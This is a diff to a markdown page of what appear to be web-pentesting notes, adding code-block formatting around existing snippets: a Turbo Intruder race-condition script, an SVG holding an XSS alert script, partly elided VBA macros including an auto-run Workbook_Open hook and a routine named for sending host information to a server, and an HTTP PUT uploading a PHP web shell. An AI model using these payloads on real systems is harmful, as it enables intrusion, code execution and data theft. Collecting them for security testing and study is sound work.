@@ -72,6 +72,7 @@
 
 <summary>Race Condition Code</summary>
 
+{% code lineNumbers="true" %}
 ```python
 def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
@@ -93,6 +94,7 @@ def queueRequests(target, wordlists):
 def handleResponse(req, interesting):
     table.add(req)
 ```
+{% endcode %}
 
 </details>
 
@@ -105,6 +107,7 @@ def handleResponse(req, interesting):
 
 <summary>SVG Payload</summary>
 
+{% code lineNumbers="true" %}
 ```svg
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
@@ -113,6 +116,7 @@ def handleResponse(req, interesting):
     <script type="text/javascript">alert("XSS");</script>
   </svg>
 ```
+{% endcode %}
 
 </details>
 
@@ -120,7 +124,9 @@ def handleResponse(req, interesting):
 
 <summary>VBA Script</summary>
 
+{% code lineNumbers="true" %}
 ```vba
+#Script - 1
 Sub SendHostInfoToServer()
     Dim Username As String
     Dim Hostname As String
@@ -143,7 +149,9 @@ Sub SendHostInfoToServer()
 ErrorHandler:
     MsgBox "Error " & Err.Number & ": " & Err.Description, vbCritical, "Macro Error"
 End Sub
------------------------------------------------------------------------------------------
+
+#Script - 2 (part 1)
+
 Sub LaunchCalculator()
     On Error GoTo ErrorHandler
 
@@ -156,14 +164,16 @@ Sub LaunchCalculator()
 ErrorHandler:
     MsgBox "Error " & Err.Number & ": " & Err.Description, vbCritical, "Launch Error"
 End Sub
------------------------------------------------------------------------------------------
+
+#Script - 2 (part 2)
+
 #add in "This_Workbook"
 
 Private Sub Workbook_Open()
     LaunchCalculator
 End Sub
------------------------------------------------------------------------------------------
 ```
+{% endcode %}
 
 </details>
 
@@ -177,6 +187,7 @@ End Sub
 
 <summary>HTTP Request</summary>
 
+{% code lineNumbers="true" %}
 ```http
 PUT /images/exploit.php HTTP/1.1
 Host: vulnerable-website.com
@@ -185,6 +196,7 @@ Content-Length: 49
 
 <?php system($_GET[‘c’]);?>
 ```
+{% endcode %}
 
 </details>
 
